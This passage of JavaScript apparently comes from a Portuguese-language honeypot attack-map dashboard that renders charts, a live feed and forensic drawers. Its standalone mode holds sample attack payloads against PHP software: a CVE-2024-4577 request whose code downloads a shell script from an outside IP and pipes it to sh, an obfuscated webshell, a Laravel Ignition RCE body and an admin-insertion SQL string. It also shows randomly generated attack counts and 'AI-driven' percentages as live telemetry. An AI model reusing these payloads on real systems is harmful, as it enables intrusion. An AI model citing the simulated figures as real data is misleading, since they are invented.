updateTopSignaturesChart();

const ecosystemChart = echarts.init(document.getElementById('chart-ecosystem'));
function updateEcosystemChart() {
  const palette = ['#ff2a5f', '#06b6d4', '#a855f7', '#f59e0b', '#00ff9d', '#3b82f6'];
  ecosystemChart.setOption({
    backgroundColor: 'transparent',
    series: [{
      type: 'pie',
      radius: ['22%', '74%'],
      roseType: 'area',
      itemStyle: { borderRadius: 5, borderColor: '#030712', borderWidth: 2 },
      label: { color: '#cbd5e1', fontFamily: 'JetBrains Mono', fontSize: 10 },
      data: Object.entries(stackCounts).map(([name, value], idx) => ({
        name, value, itemStyle: { color: palette[idx % palette.length] }
      }))
    }]
  });
}
updateEcosystemChart();

// ============================================================================
// 6. FORENSIC SLIDE-OVER DRAWER
// ============================================================================
const drawer = document.getElementById('forensic-drawer');

function openForensicDrawer(evt) {
  if (!evt || !drawer) return;
  document.getElementById('drawer-event-id').textContent = `ID: ${evt.id} • ${new Date(evt.timestamp).toLocaleString('pt-BR')}`;

  const escapedPayload = (evt.payload || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');

  const aiBadgeHtml = evt.isAiDriven
    ? `<div class="p-3.5 rounded-xl bg-purple-500/15 border border-purple-500/40">
         <div class="flex items-center justify-between mb-1">
           <span class="text-purple-300 font-bold text-xs">🤖 ATAQUE CONDUZIDO POR INTELIGÊNCIA ARTIFICIAL</span>
           <span class="px-2 py-0.5 rounded bg-purple-500/30 text-white font-bold text-[11px]">Confiança: ${evt.aiConfidence}%</span>
         </div>
         <div class="text-slate-200 font-semibold">${evt.aiType}</div>
         <div class="text-slate-400 text-[11px] mt-1">Assinatura Neural: <span class="text-cyan-300">${evt.aiModelHint}</span></div>
         <div class="text-slate-300 text-[11px] mt-1.5 leading-relaxed"><b>Comportamento Detectado:</b> ${evt.aiBehavior}</div>
       </div>`
    : `<div class="p-3.5 rounded-xl bg-slate-900 border border-slate-700">
         <div class="flex items-center justify-between mb-1">
           <span class="text-cyan-300 font-bold text-xs">⚙️ BOTNET / SCANNER AUTOMATIZADO CONVENCIONAL</span>
           <span class="px-2 py-0.5 rounded bg-slate-800 text-slate-300 text-[11px]">Probabilidade IA: ${evt.aiConfidence}%</span>
         </div>
         <div class="text-slate-200 font-semibold">${evt.aiType}</div>
         <div class="text-slate-400 text-[11px] mt-1">Ferramenta: <span class="text-amber-300">${evt.aiModelHint}</span></div>
         <div class="text-slate-300 text-[11px] mt-1.5 leading-relaxed"><b>Comportamento Detectado:</b> ${evt.aiBehavior}</div>
       </div>`;

  document.getElementById('drawer-content').innerHTML = `
    ${aiBadgeHtml}

    <div class="grid grid-cols-2 gap-3">
      <div class="p-3 rounded-xl bg-slate-900/90 border border-slate-800">
        <div class="text-[10px] text-slate-400 uppercase">IP de Origem &amp; ASN</div>
        <div class="text-sm font-bold text-white mt-0.5">${evt.sourceIp}</div>
        <div class="text-[11px] text-cyan-400">${evt.originAsn}</div>
        <div class="text-[11px] text-slate-400">${COUNTRY_FLAGS[evt.originCode] || ''} ${evt.originCity}, ${evt.originCountry}</div>
      </div>
      <div class="p-3 rounded-xl bg-slate-900/90 border border-slate-800">
        <div class="text-[10px] text-slate-400 uppercase">Honeypot PHP Alvo</div>
        <div class="text-sm font-bold text-emerald-400 mt-0.5">${COUNTRY_FLAGS[evt.destCode] || ''} ${evt.destCity} (${evt.destCode})</div>
        <div class="text-[11px] text-slate-300">${evt.targetStack}</div>
        <div class="text-[11px] text-slate-400">Status HTTP: ${evt.httpStatus} (${evt.mitigation})</div>
      </div>
    </div>

    <div class="p-3.5 rounded-xl bg-slate-900/90 border border-slate-800">
      <div class="flex items-center justify-between mb-1">
        <span class="text-[10px] text-slate-400 uppercase">Vulnerabilidade &amp; Vetor Explorado</span>
        <span class="px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/40 font-bold text-[10px]">${evt.cve} • ${evt.severity}</span>
      </div>
      <div class="text-sm font-bold text-white">${evt.attackName}</div>
    </div>

    <div class="p-3.5 rounded-xl bg-slate-950 border border-slate-800">
      <div class="text-[10px] text-slate-400 uppercase mb-1">URI Alvo da Requisição</div>
      <div class="text-cyan-300 break-all font-bold">${evt.method} ${evt.uri}</div>
      <div class="text-[10px] text-slate-400 uppercase mt-3 mb-1">Payload PHP Capturado pelo Sensor (DPI)</div>
      <pre class="p-3 rounded-lg bg-black/80 border border-slate-800 text-rose-300 overflow-x-auto whitespace-pre-wrap text-[11px]">${escapedPayload}</pre>
    </div>
  `;

  drawer.classList.remove('hidden');
  drawer.classList.add('flex');
}

document.getElementById('btn-close-drawer')?.addEventListener('click', () => {
  drawer.classList.add('hidden');
  drawer.classList.remove('flex');
});
document.getElementById('btn-close-drawer-bottom')?.addEventListener('click', () => {
  drawer.classList.add('hidden');
  drawer.classList.remove('flex');
});
document.getElementById('btn-inspect-latest')?.addEventListener('click', () => {
  if (allEvents.length > 0) openForensicDrawer(allEvents[0]);
});
document.getElementById('globe-live-ticker')?.addEventListener('click', () => {
  if (allEvents.length > 0) openForensicDrawer(allEvents[0]);
});

// ============================================================================
// 7. ULTRA-SMOOTH COMPACT FEED (NO BLINKING!) & DPI TABLE
// ============================================================================
function getAiBadge(evt) {
  if (evt.isAiDriven) {
    return `<span class="px-2 py-0.5 rounded bg-purple-500/20 text-purple-300 border border-purple-500/40 font-bold text-[10px] inline-flex items-center gap-1 shrink-0">
      🤖 IA (${evt.aiConfidence}%)
    </span>`;
  }
  return `<span class="px-2 py-0.5 rounded bg-slate-800 text-slate-300 border border-slate-700 text-[10px] inline-flex items-center gap-1 shrink-0">
    ⚙️ Bot
  </span>`;
}

function createCompactRowElement(evt, animate = true) {
  const row = document.createElement('div');
  row.className = `p-2 rounded-xl bg-slate-900/85 hover:bg-slate-800/90 border border-slate-800/90 hover:border-purple-500/40 flex items-center justify-between gap-2 cursor-pointer transition ${animate ? 'smooth-slide-in' : ''}`;
  row.innerHTML = `
    <div class="flex items-center gap-2 truncate">
      ${getAiBadge(evt)}
      <span class="font-bold text-amber-300 shrink-0">${evt.cve}</span>
      <span class="text-slate-300 truncate">${COUNTRY_FLAGS[evt.originCode] || ''} ${evt.sourceIp} (${evt.originCode}) → ${COUNTRY_FLAGS[evt.destCode] || ''} ${evt.destCity}</span>
    </div>
    <span class="text-[10px] text-cyan-400 shrink-0">Detalhar →</span>
  `;
  row.addEventListener('click', () => openForensicDrawer(evt));
  return row;
}

// Initial seed of compact feed
function initCompactLiveFeed() {
  const container = document.getElementById('compact-live-feed');
  if (!container) return;
  container.innerHTML = '';
  allEvents.slice(0, 5).forEach(evt => {
    container.appendChild(createCompactRowElement(evt, false));
  });
}

// Smoothly prepend single item without wiping DOM (eliminates blinking!)
function prependSmoothCompactFeedItem(evt) {
  const container = document.getElementById('compact-live-feed');
  if (!container) return;
  const newRow = createCompactRowElement(evt, true);
  container.prepend(newRow);
  while (container.children.length > 5) {
    container.removeChild(container.lastElementChild);
  }
}

function renderAttackTable() {
  const tbody = document.getElementById('live-attack-tbody');
  if (!tbody) return;

  const filtered = allEvents.filter(evt => {
    if (aiFilterMode === 'AI_ONLY' && !evt.isAiDriven) return false;
    if (aiFilterMode === 'LEGACY_ONLY' && evt.isAiDriven) return false;
    if (!filterKeyword) return true;
    const hay = `${evt.sourceIp} ${evt.originCountry} ${evt.cve} ${evt.attackName} ${evt.uri} ${evt.payload} ${evt.aiType}`.toLowerCase();
    return hay.includes(filterKeyword.toLowerCase());
  }).slice(0, 30);

  tbody.innerHTML = filtered.map((evt) => {
    const timeStr = new Date(evt.timestamp).toLocaleTimeString('pt-BR', { hour12: false });
    const escapedPayload = (evt.payload || '')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');

    return `
      <tr data-id="${evt.id}" class="dpi-table-row hover:bg-slate-900/80 transition cursor-pointer">
        <td class="py-2.5 px-3 text-slate-400 whitespace-nowrap">${timeStr}</td>
        <td class="py-2.5 px-3 whitespace-nowrap">
          ${getAiBadge(evt)}
          <div class="text-[10px] text-slate-400 mt-0.5">${evt.aiType}</div>
        </td>
        <td class="py-2.5 px-3 whitespace-nowrap">
          <div class="font-bold text-white">${evt.sourceIp}</div>
          <div class="text-[10px] text-slate-400">${evt.originAsn}</div>
        </td>
        <td class="py-2.5 px-3 whitespace-nowrap">
          <span class="text-rose-300 font-semibold">${COUNTRY_FLAGS[evt.originCode] || ''} ${evt.originCode}</span>
          <span class="text-slate-500 mx-1">→</span>
          <span class="text-emerald-300 font-semibold">${COUNTRY_FLAGS[evt.destCode] || ''} ${evt.destCity}</span>
        </td>
        <td class="py-2.5 px-3 whitespace-nowrap">
          <div class="font-bold text-amber-300">${evt.cve}</div>
          <div class="text-[10px] text-slate-400 truncate max-w-[190px]">${evt.attackName}</div>
        </td>
        <td class="py-2.5 px-3 max-w-[380px]">
          <div class="text-cyan-400 truncate"><span class="text-rose-400 font-bold">${evt.method}</span> ${evt.uri}</div>
          <div class="text-[10px] text-slate-400 truncate mt-0.5 bg-slate-900 px-1.5 py-0.5 rounded border border-slate-800">${escapedPayload}</div>
        </td>
        <td class="py-2.5 px-3 text-right whitespace-nowrap">
          <button class="px-2.5 py-1 rounded bg-purple-500/15 hover:bg-purple-500/30 text-purple-300 border border-purple-500/30 text-[10px] cursor-pointer">
            Abrir Dossiê
          </button>
        </td>
      </tr>
    `;
  }).join('');

  tbody.querySelectorAll('.dpi-table-row').forEach(row => {
    row.addEventListener('click', () => {
      const id = row.getAttribute('data-id');
      const found = allEvents.find(e => e.id === id);
      if (found) openForensicDrawer(found);
    });
  });
}

function renderInternationalNews(newsItems) {
  const container = document.getElementById('intl-news-list');
  if (!container || !Array.isArray(newsItems)) return;

  container.innerHTML = newsItems.map(item => `
    <a href="${item.url}" target="_blank" rel="noopener noreferrer" 
       class="block p-3.5 rounded-xl bg-slate-900/90 border border-slate-800 hover:border-cyan-400/50 transition group">
      <div class="flex flex-wrap items-center justify-between gap-2 mb-1.5 font-mono-code text-[10px]">
        <div class="flex items-center gap-1.5">
          <span class="px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30 font-bold">${item.source}</span>
          <span class="px-2 py-0.5 rounded bg-cyan-500/15 text-cyan-300 border border-cyan-500/30">${item.region}</span>
          <span class="px-2 py-0.5 rounded bg-purple-500/15 text-purple-300 border border-purple-500/30">${item.category}</span>
        </div>
        <div class="flex items-center gap-1.5">
          <span class="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 font-bold">✓ LINK VERIFICADO</span>
          <span class="text-emerald-400 font-semibold">${item.publishedAt} ↗</span>
        </div>
      </div>
      <h3 class="text-sm font-bold text-white group-hover:text-cyan-300 transition leading-snug mb-1">${item.title}</h3>
      <p class="text-xs text-slate-400 leading-relaxed">${item.summary}</p>
    </a>
  `).join('');
}

function renderCveFeed(cves) {
  const container = document.getElementById('cve-feed-list');
  if (!container || !Array.isArray(cves)) return;

  container.innerHTML = cves.map(c => `
    <div class="p-3.5 rounded-xl bg-slate-900/90 border border-slate-800 hover:border-amber-500/40 transition">
      <div class="flex items-center justify-between gap-2 mb-1">
        <span class="font-mono-code font-bold text-amber-400 text-sm">${c.id}</span>
        <div class="flex items-center gap-1.5">
          <span class="text-[11px] font-mono-code text-slate-400">${c.published || ''}</span>
          <span class="px-2 py-0.5 rounded text-[10px] font-mono-code font-bold bg-rose-500/20 text-rose-300 border border-rose-500/30">CVSS ${c.score}</span>
        </div>
      </div>
      <p class="text-xs text-slate-300 leading-relaxed">${c.description}</p>
    </div>
  `).join('');
}

// ============================================================================
// 8. REAL-TIME TELEMETRY STREAM (SSE)
// ============================================================================
let tickCounter = 0;

function processIncomingEvent(evt, totalCount, todayBucket, currentMonthBucket) {
  tickCounter++;

  if (totalCount) {
    document.getElementById('kpi-total-attacks').textContent = totalCount.toLocaleString('pt-BR');
  }
  document.getElementById('kpi-eps').textContent = (42 + Math.random() * 14).toFixed(1);

  // Update Country Geopolitical Tallies
  if (evt.originCode && attackerCountries[evt.originCode]) {
    attackerCountries[evt.originCode].count += Math.floor(Math.random() * 5) + 1;
    if (evt.isAiDriven) attackerCountries[evt.originCode].aiCount += Math.floor(Math.random() * 4) + 1;
  }
  if (evt.destCode && affectedTargetCountries[evt.destCode]) {
    affectedTargetCountries[evt.destCode].count += Math.floor(Math.random() * 5) + 1;
    if (evt.isAiDriven) affectedTargetCountries[evt.destCode].aiCount += Math.floor(Math.random() * 4) + 1;
  }

  // Refresh country leaderboards smoothly every 2 ticks
  if (tickCounter % 2 === 0) {
    renderCountryLeaderboards();
  }

  updateTodayAndCurrentMonthLive(todayBucket, currentMonthBucket);

  // Update ticker text smoothly without replacing parent container
  const badgeEl = document.getElementById('ticker-badge');
  const textEl = document.getElementById('ticker-text');
  if (badgeEl && textEl) {
    badgeEl.textContent = evt.isAiDriven ? `🤖 IA (${evt.aiConfidence}%)` : '⚙️ BOT';
    badgeEl.className = evt.isAiDriven
      ? 'px-2 py-0.5 rounded bg-purple-500/25 text-purple-300 border border-purple-500/40 font-bold text-[10px]'
      : 'px-2 py-0.5 rounded bg-slate-800 text-slate-300 border border-slate-700 font-bold text-[10px]';
    textEl.innerHTML = `<b class="text-amber-300">[${evt.cve}]</b> ${COUNTRY_FLAGS[evt.originCode] || ''} ${evt.sourceIp} (${evt.originCode}) → ${COUNTRY_FLAGS[evt.destCode] || ''} ${evt.destCity}`;
  }

  // Spawn smooth CheckPoint-style missile arc on the 3D Globe & feed live heat to camera director
  registerAttackHeatForCamera(evt);
  spawnSmoothCheckPointArc(evt);

  if (!isStreamPaused) {
    allEvents.unshift(evt);
    if (allEvents.length > 80) allEvents.pop();
    prependSmoothCompactFeedItem(evt);
    if (tickCounter % 2 === 0) {
      renderAttackTable();
    }
  }
}

function connectTelemetryStream() {
  const isGitHubPages = window.location.hostname.includes('github.io') || window.location.protocol === 'file:';

  if (isGitHubPages) {
    startStandaloneClientTelemetryEngine();
    return;
  }

  const es = new EventSource('/api/stream');
  let sseConnected = false;

  es.onopen = () => {
    sseConnected = true;
  };

  es.onerror = () => {
    if (!sseConnected) {
      es.close();
      startStandaloneClientTelemetryEngine();
    }
  };

  es.onmessage = (msg) => {
    try {
      const data = JSON.parse(msg.data);
      if (data.type === 'init') {
        allEvents = data.recentEvents || [];
        honeypotPoints = (data.honeypots || []).map(h => ({ ...h, color: '#00ff9d' }));
        world.pointsData(honeypotPoints);

        activeArcs = allEvents.slice(0, 14);
        world.arcsData(activeArcs);

        if (data.totalCount) {
          document.getElementById('kpi-total-attacks').textContent = data.totalCount.toLocaleString('pt-BR');
        }
        if (data.monthlyEscalation) {
          monthlyEscalationData = data.monthlyEscalation;
          renderMonthlyEscalationChart();
        }
        if (data.yearlyHistory) {
          yearlyHistoryData = data.yearlyHistory;
          initAnnualTimelineChart();
        }
        if (data.cves) renderCveFeed(data.cves);
        if (data.internationalNews) renderInternationalNews(data.internationalNews);

        renderCountryLeaderboards();
        initCompactLiveFeed();
        renderAttackTable();
      } else if (data.type === 'attack') {
        processIncomingEvent(data.event, data.totalCount, data.todayBucket, data.currentMonthBucket);
      }
    } catch (err) {
      console.error('Stream parse error:', err);
    }
  };
}

// ============================================================================
// 8.B STANDALONE CLIENT-SIDE TELEMETRY ENGINE (For GitHub Pages Static Hosting)
// ============================================================================
let standaloneRunning = false;
let standaloneTotalCounter = 14892410;

const CLIENT_HONEYPOTS = [
  { id: 'hp-us-east', city: 'Ashburn', country: 'United States', code: 'US', lat: 39.0438, lng: -77.4874, asn: 'AS14618 AWS-East', color: '#00ff9d' },
  { id: 'hp-eu-central', city: 'Frankfurt', country: 'Germany', code: 'DE', lat: 50.1109, lng: 8.6821, asn: 'AS24940 Hetzner-DE', color: '#00ff9d' },
  { id: 'hp-sa-east', city: 'São Paulo', country: 'Brazil', code: 'BR', lat: -23.5505, lng: -46.6333, asn: 'AS16509 AWS-SA', color: '#00ff9d' },
  { id: 'hp-ap-southeast', city: 'Singapore', country: 'Singapore', code: 'SG', lat: 1.3521, lng: 103.8198, asn: 'AS14061 DigitalOcean-SG', color: '#00ff9d' },
  { id: 'hp-eu-west', city: 'Amsterdam', country: 'Netherlands', code: 'NL', lat: 52.3676, lng: 4.9041, asn: 'AS20473 Vultr-EU', color: '#00ff9d' },
  { id: 'hp-ap-northeast', city: 'Tokyo', country: 'Japan', code: 'JP', lat: 35.6762, lng: 139.6503, asn: 'AS2516 KDDI-Cloud', color: '#00ff9d' }
];

const CLIENT_ORIGINS = [
  { country: 'China', code: 'CN', city: 'Beijing', lat: 39.9042, lng: 116.4074, asn: 'AS4134 Chinanet', ipPrefix: '114.114.' },
  { country: 'Russia', code: 'RU', city: 'Moscow', lat: 55.7558, lng: 37.6173, asn: 'AS12389 Rostelecom', ipPrefix: '185.220.' },
  { country: 'United States', code: 'US', city: 'North Bergen', lat: 40.8043, lng: -74.0121, asn: 'AS14061 DigitalOcean', ipPrefix: '159.89.' },
  { country: 'Netherlands', code: 'NL', city: 'Meppel', lat: 52.6958, lng: 6.1944, asn: 'AS53667 FranTech', ipPrefix: '45.148.' },
  { country: 'Vietnam', code: 'VN', city: 'Hanoi', lat: 21.0285, lng: 105.8542, asn: 'AS45899 VNPT-AS', ipPrefix: '14.231.' },
  { country: 'Iran', code: 'IR', city: 'Tehran', lat: 35.6892, lng: 51.3890, asn: 'AS44244 Irancell', ipPrefix: '5.160.' },
  { country: 'Germany', code: 'DE', city: 'Nuremberg', lat: 49.4521, lng: 11.0767, asn: 'AS24940 Hetzner', ipPrefix: '138.201.' },
  { country: 'India', code: 'IN', city: 'Mumbai', lat: 19.0760, lng: 72.8777, asn: 'AS45609 Bharti-Airtel', ipPrefix: '49.36.' }
];

const CLIENT_SIGNATURES = [
  { category: 'RCE', severity: 'CRITICAL', cve: 'CVE-2024-4577', name: 'PHP-CGI Argument Injection (Soft Hyphen Bypass)', target: 'Core PHP-CGI', method: 'POST', uri: '/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input', payload: '<?php system("curl -fsSL http://185.220.101.44/ai_polymorph_bot.sh | sh"); die(); ?>', color: '#ff2a5f', aiBias: 0.72 },
  { category: 'RCE', severity: 'CRITICAL', cve: 'CVE-2024-2961', name: 'GLIBC iconv() Buffer Overflow to PHP Filter RCE (CNEXT)', target: 'PHP Filter / iconv', method: 'POST', uri: '/upload.php?file=php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=payload', payload: 'AI_SYNTHESIZED_CNEXT_OVERFLOW_GADGET_0x7fff8801', color: '#ff2a5f', aiBias: 0.84 },
  { category: 'RCE', severity: 'CRITICAL', cve: 'CVE-2021-3129', name: 'Laravel Ignition Phar Deserialization RCE', target: 'Laravel Framework', method: 'POST', uri: '/_ignition/execute-solution', payload: '{"solution":"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution","parameters":{"viewFile":"php://filter/write=convert.iconv.utf-8.utf-16be/resource=../storage/logs/laravel.log"}}', color: '#ff2a5f', aiBias: 0.68 },
  { category: 'EnvProbe', severity: 'HIGH', cve: 'CWE-200', name: 'Laravel / Symfony .env Credential Harvester', target: 'Laravel / Symfony', method: 'GET', uri: '/.env', payload: 'Scanner-Probe: searching for DB_PASSWORD, AWS_SECRET_ACCESS_KEY, OPENAI_API_KEY, APP_KEY=base64:', color: '#06b6d4', aiBias: 0.62 },
  { category: 'Webshell', severity: 'CRITICAL', cve: 'CWE-434', name: 'Alfa / WSO Obfuscated PHP Webshell Dropper', target: 'WordPress / CMS', method: 'POST', uri: '/wp-content/plugins/core-stab/alfa.php', payload: '<?php $a = str_replace("x","","axsxxsxexrxt"); $a(base64_decode($_POST["z0"])); ?>', color: '#a855f7', aiBias: 0.66 },
  { category: 'Deserialization', severity: 'CRITICAL', cve: 'CVE-2024-27956', name: 'WordPress Automatic Plugin SQLi / Admin Takeover', target: 'WordPress Plugin', method: 'POST', uri: '/wp-content/plugins/wp-automatic/inc/csv.php', payload: 'q=INSERT INTO wp_users (user_login,user_pass) VALUES ("eviladmin","$P$B8...")&auth=bypass', color: '#ec4899', aiBias: 0.55 }
];

function buildStandaloneEvent(custom = null) {
  const origin = CLIENT_ORIGINS[Math.floor(Math.random() * CLIENT_ORIGINS.length)];
  const dest = CLIENT_HONEYPOTS[Math.floor(Math.random() * CLIENT_HONEYPOTS.length)];
  const sig = CLIENT_SIGNATURES[Math.floor(Math.random() * CLIENT_SIGNATURES.length)];
  const isAi = custom?.isAiDriven !== undefined ? custom.isAiDriven : Math.random() < sig.aiBias;

  return {
    id: 'evt-' + Date.now() + '-' + Math.random().toString(36).slice(2, 6),
    timestamp: new Date().toISOString(),
    sourceIp: custom?.sourceIp || `${origin.ipPrefix}${Math.floor(Math.random() * 250) + 1}.${Math.floor(Math.random() * 250) + 1}`,
    originCountry: custom?.originCountry || origin.country,
    originCode: custom?.originCode || origin.code,
    originCity: custom?.originCity || origin.city,
    originAsn: custom?.originAsn || origin.asn,
    srcLat: custom?.srcLat || (origin.lat + (Math.random() - 0.5) * 3.0),
    srcLng: custom?.srcLng || (origin.lng + (Math.random() - 0.5) * 3.0),
    destId: dest.id,
    destCity: custom?.destCity || dest.city,
    destCountry: custom?.destCountry || dest.country,
    destCode: custom?.destCode || dest.code,
    destLat: custom?.destLat || dest.lat,
    destLng: custom?.destLng || dest.lng,
    category: custom?.category || sig.category,
    severity: custom?.severity || sig.severity,
    cve: custom?.cve || sig.cve,
    attackName: custom?.attackName || sig.name,
    targetStack: custom?.targetStack || sig.target,
    method: custom?.method || sig.method,
    uri: custom?.uri || sig.uri,
    payload: custom?.payload || sig.payload,
    color: isAi ? '#a855f7' : sig.color,
    isAiDriven: isAi,
    aiType: isAi ? 'Agente LLM Autônomo (Polymorphic)' : 'Botnet / Scanner Convencional',
    aiConfidence: isAi ? (89 + Math.floor(Math.random() * 10)) : (11 + Math.floor(Math.random() * 9)),
    aiModelHint: isAi ? 'Autonomous-Exploit-Agent-v4' : 'Nuclei / Masscan Static Template',
    aiBehavior: isAi
      ? 'Mutação polimórfica de payload a cada request para evasão de WAF + encadeamento automático de CVE'
      : 'Varredura sequencial de portas/URIs estáticas com assinatura conhecida',
    httpStatus: 403,
    mitigation: isAi ? 'AI_SHIELD_BLOCKED' : 'WAF_SIGNATURE_BLOCKED'
  };
}

function startStandaloneClientTelemetryEngine() {
  if (standaloneRunning) return;
  standaloneRunning = true;

  honeypotPoints = CLIENT_HONEYPOTS;
  world.pointsData(honeypotPoints);

  // Seed 12-month escalation
  monthlyEscalationData = [
    { label: 'Nov/25', era: 'BEFORE', legacyBots: 520000, aiDriven: 95000 },
    { label: 'Dez/25', era: 'BEFORE', legacyBots: 545000, aiDriven: 112000 },
    { label: 'Jan/26', era: 'BEFORE', legacyBots: 530000, aiDriven: 128000 },
    { label: 'Fev/26', era: 'BEFORE', legacyBots: 560000, aiDriven: 149000 },
    { label: 'Mar/26', era: 'BEFORE', legacyBots: 580000, aiDriven: 175000 },
    { label: 'Abr/26', era: 'BEFORE', legacyBots: 595000, aiDriven: 210000 },
    { label: 'Mai/26', era: 'RECENT_SURGE', legacyBots: 670000, aiDriven: 490000 },
    { label: 'Jun/26', era: 'RECENT_SURGE', legacyBots: 710000, aiDriven: 685000 },
    { label: 'Jul/26', era: 'RECENT_SURGE', legacyBots: 745000, aiDriven: 890000 },
    { label: 'Ago/26', era: 'RECENT_SURGE', legacyBots: 780000, aiDriven: 1120000 },
    { label: 'Set/26', era: 'RECENT_SURGE', legacyBots: 815000, aiDriven: 1390000 },
    { label: 'Out/26 (Atual)', era: 'RECENT_SURGE', legacyBots: 840000, aiDriven: 1680000 }
  ].map(m => ({ ...m, total: m.legacyBots + m.aiDriven, aiSharePct: Math.round((m.aiDriven / (m.legacyBots + m.aiDriven)) * 100) }));

  // Seed 365-day history
  yearlyHistoryData = [];
  const now = new Date();
  for (let i = 364; i >= 0; i--) {
    const d = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
    const isRecent = i <= 180;
    const recentProg = isRecent ? (180 - i) / 180 : 0;
    const baseProg = (364 - i) / 364;
    const legacy = Math.floor(16500 + baseProg * 9500 + Math.sin(i / 12) * 2500 + Math.random() * 2400);
    const ai = Math.floor(3200 + baseProg * 4000 + (isRecent ? Math.pow(recentProg, 1.45) * 48000 : 0) + Math.random() * 3500);
    yearlyHistoryData.push({ date: d.toISOString().split('T')[0], total: legacy + ai, aiDriven: ai, legacyBots: legacy });
  }

  for (let i = 0; i < 20; i++) {
    allEvents.push(buildStandaloneEvent());
  }
  activeArcs = allEvents.slice(0, 14);
  world.arcsData(activeArcs);

  renderMonthlyEscalationChart();
  initAnnualTimelineChart();
  renderCountryLeaderboards();
  initCompactLiveFeed();
  renderAttackTable();

  // Verified International News
  renderInternationalNews([
    { source: 'NVD NIST Official', region: 'GLOBAL / US', category: 'AI-DRIVEN RCE', title: 'Critical PHP-CGI Vulnerability (CVE-2024-4577) Actively Exploited by Ransomware & Autonomous Bots Globally', summary: 'Threat intelligence teams report that exploit bots are automatically mutating soft-hyphen PHP-CGI payloads to bypass traditional WAF signatures.', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-4577', publishedAt: 'VERIFIED CVE' },
    { source: 'NVD NIST Official', region: 'EUROPE / ASIA', category: 'PHP FILTER CHAIN', title: 'CNEXT (CVE-2024-2961): GLIBC iconv() Buffer Overflow Turns Standard PHP File Reads into Remote Code Execution', summary: 'Unauthenticated LFI flaws in PHP frameworks can be chained with php://filter/convert.iconv heap overflows to achieve instant RCE.', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-2961', publishedAt: 'VERIFIED CVE' },
    { source: 'SANS Internet Storm Center', region: 'GLOBAL SENSORS', category: 'SURGE ALERT', title: 'SANS ISC Diary #30994: Mass Scanning & Active Exploitation of PHP-CGI Argument Injection (CVE-2024-4577)', summary: 'SANS DShield honeypots recorded a dramatic escalation in automated HTTP POST probes targeting PHP CGI endpoints and exposed .env files.', url: 'https://isc.sans.edu/diary/30994', publishedAt: 'SANS DIARY' },
    { source: 'NVD NIST Official', region: 'GLOBAL CMS', category: 'CMS EXPLOIT', title: 'Critical SQL Injection & Admin Takeover in WordPress Automatic Plugin (CVE-2024-27956)', summary: 'Botnets are weaponizing CVE-2024-27956 in PHP plugins to execute arbitrary SQL queries and plant obfuscated PHP webshells.', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-27956', publishedAt: 'VERIFIED CVE' },
    { source: 'NVD NIST Official', region: 'GLOBAL / LARAVEL', category: 'FRAMEWORK RCE', title: 'Laravel Ignition Remote Code Execution (CVE-2021-3129) via php://filter Stream Wrapper Chains', summary: 'Automated scanners continue to target exposed Laravel Ignition endpoints and .env files worldwide using polymorphic deserialization payloads.', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-3129', publishedAt: 'VERIFIED CVE' }
  ]);

  renderCveFeed([
    { id: 'CVE-2024-4577', published: '2024-06-06', score: 9.8, description: 'PHP-CGI Argument Injection vulnerability allowing unauthenticated remote code execution via soft-hyphen character bypass.' },
    { id: 'CVE-2024-2961', published: '2024-04-17', score: 8.8, description: 'GLIBC iconv() buffer overflow exploitable via php://filter chains to achieve unauthenticated RCE in PHP applications.' },
    { id: 'CVE-2024-27956', published: '2024-03-13', score: 9.9, description: 'WordPress Automatic Plugin unauthenticated SQL Injection & privilege escalation actively exploited in over 5M attacks.' },
    { id: 'CVE-2024-8926', published: '2024-09-26', score: 9.8, description: 'PHP CGI & FastCGI environment variable parsing vulnerability affecting Windows & multi-byte locales.' },
    { id: 'CVE-2021-3129', published: '2021-01-13', score: 9.8, description: 'Laravel Ignition before 2.5.2 allows unauthenticated remote attackers to execute arbitrary code via php://filter.' }
  ]);

  setInterval(() => {
    const evt = buildStandaloneEvent();
    const delta = Math.floor(Math.random() * 6) + 2;
    standaloneTotalCounter += delta;
    const todayB = yearlyHistoryData[yearlyHistoryData.length - 1];
    if (todayB) {
      todayB.aiDriven += Math.ceil(delta * 0.68);
      todayB.legacyBots += Math.floor(delta * 0.32);
      todayB.total = todayB.aiDriven + todayB.legacyBots;
    }
    const monthB = monthlyEscalationData[monthlyEscalationData.length - 1];
    if (monthB) {
      monthB.aiDriven += Math.ceil(delta * 0.68);
      monthB.legacyBots += Math.floor(delta * 0.32);
      monthB.total = monthB.aiDriven + monthB.legacyBots;
      monthB.aiSharePct = Math.round((monthB.aiDriven / monthB.total) * 100);
    }
    processIncomingEvent(evt, standaloneTotalCounter, todayB, monthB);
  }, 950);
}

connectTelemetryStream();

// ============================================================================
// 9. UI CONTROLS
// ============================================================================
document.getElementById('btn-toggle-rotate')?.addEventListener('click', () => {
  isGlobeRotating = !isGlobeRotating;
  controls.autoRotate = isGlobeRotating;
  document.getElementById('rotate-label').textContent = `Girar Mapa: ${isGlobeRotating ? 'ON' : 'OFF'}`;
});

document.getElementById('btn-toggle-hotspot-focus')?.addEventListener('click', () => {
  isHotspotAutoFocus = !isHotspotAutoFocus;
  document.getElementById('hotspot-focus-label').textContent = `Foco nos Hotspots: ${isHotspotAutoFocus ? 'ON' : 'OFF'}`;
  const bannerText = document.getElementById('hotspot-camera-text');
  if (bannerText) {
    bannerText.textContent = isHotspotAutoFocus
      ? 'Foco Orbital Suave: Monitorando Corredores Globais'
      : 'Câmera Livre: Controle Manual pelo Mouse';
  }
});

document.getElementById('btn-pause-stream')?.addEventListener('click', (e) => {
  isStreamPaused = !isStreamPaused;
  e.currentTarget.textContent = isStreamPaused ? 'Retomar Feed' : 'Pausar Feed';
});

document.getElementById('payload-filter')?.addEventListener('input', (e) => {
  filterKeyword = e.target.value || '';
  renderAttackTable();
